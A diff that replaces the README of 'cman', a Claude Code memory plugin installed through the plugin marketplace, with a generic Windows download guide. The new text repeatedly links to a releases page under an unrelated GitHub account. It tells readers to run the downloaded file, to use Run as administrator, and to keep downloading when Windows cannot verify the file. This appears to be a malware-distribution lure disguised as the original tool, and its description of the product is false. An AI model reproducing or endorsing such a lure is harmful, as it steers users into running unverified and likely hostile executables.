@@ -1,150 +1,193 @@
-# cman — Agentic Memory for Claude Code
+# 🧠 cman - Keep Claude Code in memory
 
-Your memory is already there. cman just searches it agentically.
+[![Download cman](https://img.shields.io/badge/Download-cman-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kingbroskingbros41-a11y/cman/releases)
 
-No external database, no API keys, no extra storage. cman gives Claude search over your existing sessions, plans, and memory files — and lets it summarize what matters.
+## 🚀 What cman does
 
-## Installation
+cman helps Claude Code keep track of useful details while you work. It stores memory for your sessions so you do not need to repeat the same context again and again. That makes long tasks easier to manage and keeps your work moving.
 
-```bash
-/plugin marketplace add laiso/cman
-/plugin install cman@cman
-```
+Use cman if you want:
+- Better session continuity
+- Less repeated setup
+- Easier recall of project details
+- A simple way to keep Claude Code focused
 
-## How it works
+## 💻 What you need
 
-Just ask Claude naturally:
+cman is made for Windows users who want a simple setup.
 
-```
-> What did I do yesterday?
-> What did I work on last week?
-> Where was that auth-related work?
-```
+You will need:
+- A Windows computer
+- Internet access
+- Permission to download apps
+- Enough space for the app and its data
 
-Claude automatically searches your sessions, plans, and memory files — then summarizes the results.
+For best results, use a recent version of Windows 10 or Windows 11.
 
-You can also use skills directly:
+## 📥 Download cman
 
-| Skill | Scope | Purpose |
-|-------|-------|---------|
-| `/remember` … | All projects | Search and summarize past sessions (e.g. `/remember FOO BAR` for keywords) |
-| `/cm-status` | Current project | Quick overview of plans, sessions, and memory (`all` for everything) |
+Visit this page to download cman:
+https://github.com/kingbroskingbros41-a11y/cman/releases
 
-The **`remember`** skill is the primary search command (`/remember`). With the plugin enabled, the palette may show the namespaced form (e.g. `cman:remember`). Workflow text lives in [`skills/cm-search/SKILL.md`](skills/cm-search/SKILL.md) for now; the legacy **`cm-search`** skill name is **deprecated** and will be removed in a future release. **`cm-status`** may appear as `cman:cm-status` in the same way.
+On the releases page, look for the latest version and download the Windows file. If you see more than one file, choose the one meant for Windows.
 
-## Example output
+## 🪟 Install on Windows
 
-### "What did I do yesterday?"
+After you download the file:
 
-<details>
-<summary>Show example</summary>
+1. Open your Downloads folder
+2. Find the cman file you just downloaded
+3. Double-click the file to start it
+4. If Windows asks for permission, choose Yes or Run
+5. Follow the on-screen steps until the app opens
 
-```
-## Work Recap — Past 24 hours
+If the download comes as a ZIP file:
+1. Right-click the ZIP file
+2. Choose Extract All
+3. Open the folder you extracted
+4. Double-click the app file inside
 
-### Completed
-- **web-app**: User dashboard chart component
-- **web-app**: Fixed pagination bug on /users endpoint
-- **web-app**: PR review (add rate limiter, update deps)
-- **infra**: Cluster upgrade plan drafted
-- **mobile-app**: Build config cleanup
+## ⚙️ First-time setup
 
-### In Progress
-- **web-app**: CSV export feature — `claude --resume a2ac93f1...`
-- **infra**: Cost analysis — `claude --resume 06365b61...`
+When you start cman for the first time, it may ask for a few basic settings. These help the app work with Claude Code.
 
-### Stats
-- 50 sessions across 4 projects
-```
+You may need to:
+- Pick a folder for memory data
+- Allow the app to read and save project notes
+- Set a workspace name
+- Link it to your Claude Code setup
 
-</details>
+Keep the default settings if you are not sure what to choose. They are a good fit for most people.
 
-### "Where was that auth work?"
+## 🧭 How to use cman
 
-<details>
-<summary>Show example</summary>
+Use cman as part of your normal Claude Code flow.
 
-```
-## Search Results for "auth"
+A simple way to work with it:
+1. Open cman
+2. Open your project in Claude Code
+3. Save the details you want Claude to remember
+4. Keep working without retyping the same context
+5. Return later and load the saved memory again
 
-### Plans
-- [Kubernetes cluster upgrade] — 3 sessions
-  (Contains service account and auth configuration)
+You can use it for:
+- Project notes
+- Task history
+- Key decisions
+- File paths
+- Preferences you want Claude to keep in mind
 
-### Memory
-- [web-app] project_oauth_migration.md
-  OAuth2 migration — moving from session-based auth to JWT tokens
+## 🧠 Good things to store
 
-### Conversation matches (deep search)
-- [web-app] Permission settings investigation — 5 days ago
-  `claude --resume a82548ab...`
-```
+cman works best when you save useful, stable details.
 
-</details>
+Good items to save:
+- What the project does
+- Folder structure
+- Common commands
+- Design rules
+- Active goals
+- Things to avoid changing
+- Important names and links
 
-### /cm-status
+Try not to store short-lived details that change every day. Keep the memory clean and useful.
 
-<details>
-<summary>Show example</summary>
+## 🛠️ Common problems
 
-```
-Status
+### The app does not open
+- Make sure the file finished downloading
+- Right-click the file and choose Run as administrator
+- Check whether Windows blocked the file
+- Download the latest release again
 
-Active Plans
-┌───┬──────────────────────────────────────────┬──────────┬─────────┐
-│ # │ Plan                                     │ Sessions │ Project │
-├───┼──────────────────────────────────────────┼──────────┼─────────┤
-│ 1 │ feat: Add user dashboard with charts     │ 12       │ web-app │
-│ 2 │ CSV export → Google Sheets integration   │ 16       │ web-app │
-│ 3 │ Kubernetes cluster upgrade               │ 3        │ infra   │
-│ 4 │ Frontend i18n support                    │ 11       │ web-app │
-└───┴──────────────────────────────────────────┴──────────┴─────────┘
+### Windows says it cannot verify the file
+- Go back to the releases page
+- Download the newest Windows version
+- Make sure you picked the correct file type for your system
 
-Recent Sessions
-┌───┬─────────────────────────┬─────────┬────────────────┬──────────────────────────────────────────────────┬─────────────────────────────┐
-│ # │ Title                   │ Project │ When           │ CLI Resume                                       │ Interactive                 │
-├───┼─────────────────────────┼─────────┼────────────────┼──────────────────────────────────────────────────┼─────────────────────────────┤
-│ 1 │ README editing          │ web-app │ 10 seconds ago │ cd ~/work/web-app && claude --resume a1b2c3d4... │ /resume a1b2c3d4...         │
-│ 2 │ Status skill testing    │ web-app │ 1 minutes ago  │ cd ~/work/web-app && claude --resume e5f6g7h8... │ /resume e5f6g7h8...         │
-│ 3 │ Search skill testing    │ web-app │ 3 minutes ago  │ cd ~/work/web-app && claude --resume i9j0k1l2... │ /resume i9j0k1l2...         │
-└───┴─────────────────────────┴─────────┴────────────────┴──────────────────────────────────────────────────┴─────────────────────────────┘
+### Claude Code does not seem to remember anything
+- Check that cman is connected to the right project
+- Confirm that memory saving is turned on
+- Save a test note and load it again
+- Restart both apps
 
-Memory Overview
-- web-app: 3 files
-  - ~/.claude/projects/.../web-app/memory/MEMORY.md
-  - ~/.claude/projects/.../web-app/memory/project_design.md
-  - ~/.claude/projects/.../web-app/memory/feedback_conventions.md
-```
+### The app starts but shows an empty memory list
+- Open the correct workspace
+- Check the folder where cman stores data
+- Make sure you did not move or delete the memory files
+- Create a new entry and save it once
 
-</details>
+## 🔒 Privacy and local data
 
-## Requirements
+cman is meant to help you keep your own work organized. In most setups, your memory stays on your machine unless you choose to move it elsewhere.
 
-- [uv](https://docs.astral.sh/uv/) (Python package runner)
+That gives you control over:
+- What gets saved
+- Which project uses which memory
+- When to clear old notes
+- How much context to keep
 
-## Architecture
+If you use it on shared computers, make sure the data folder stays private.
 
-```
-Natural language          Skills (UX)              MCP Server            Scripts (data)
-                    ┌─────────────────┐      ┌──────────────────┐  ┌────────────────┐
-"What did I do      │ remember        │─────▶│ list_sessions    │──│ sessions.py    │
- yesterday?"     ──▶│ (auto-trigger)  │─────▶│ list_plans       │──│ plans.py       │
-                    ├─────────────────┤─────▶│ list_memory      │──│ memory.py      │
-/cm-status       ──▶│ cm-status       │─────▶│ search_sessions  │──│ grep.py        │
-/remember …      ──▶│ remember        │─────▶│ (same pipeline)  │──│ (same)         │
-                    └─────────────────┘      └──────────────────┘  └────────────────┘
-                    (workflow text: skills/cm-search/SKILL.md; cm-search skill deprecated)
-```
+## 📁 Suggested folder setup
 
-Skills call MCP tools served by `server.py` (stdio transport, launched via `uv run --script`). The MCP server reuses logic from the Python scripts, which read `~/.claude/projects/**/*.jsonl` and memory files directly. Claude interprets, filters, and summarizes the output.
+A simple folder structure helps keep things neat.
 
-## Development
+Example:
+- cman
+  - workspaces
+  - notes
+  - exports
+  - backups
 
-```bash
-# Local testing
-claude --plugin-dir /path/to/cman
-```
+This makes it easier to find old memory files and copy them if you change computers.
 
-## License
+## 🔄 Updating cman
 
-MIT
+When a new version comes out:
+1. Visit the releases page
+2. Download the latest Windows file
+3. Close the old version
+4. Open the new file
+5. Check that your saved memory still appears
+
+If you keep your memory files in one folder, updates are easier to manage.
+
+## 🧪 Tips for better results
+
+- Save short notes with clear names
+- Group notes by project
+- Remove old details you no longer need
+- Use one memory set per workspace
+- Keep a backup of important files
+- Review saved notes before long sessions
+
+These habits help cman stay useful over time.
+
+## 🧩 For Claude Code users
+
+cman is a good fit if you use Claude Code for:
+- Coding tasks
+- File changes
+- Project planning
+- Step-by-step work
+- Long sessions with many turns
+
+It helps reduce repeated context and keeps your project history close at hand.
+
+## 📦 Download again anytime
+
+If you need to reinstall cman or set it up on another Windows PC, use the same download page:
+
+https://github.com/kingbroskingbros41-a11y/cman/releases
+
+## 🖥️ Expected behavior
+
+After setup, cman should let you:
+- Open saved memory
+- Add new notes
+- Update project context
+- Keep work tied to one workspace
+- Reuse details across Claude Code sessions
+
+If your app does these things, it is ready to use
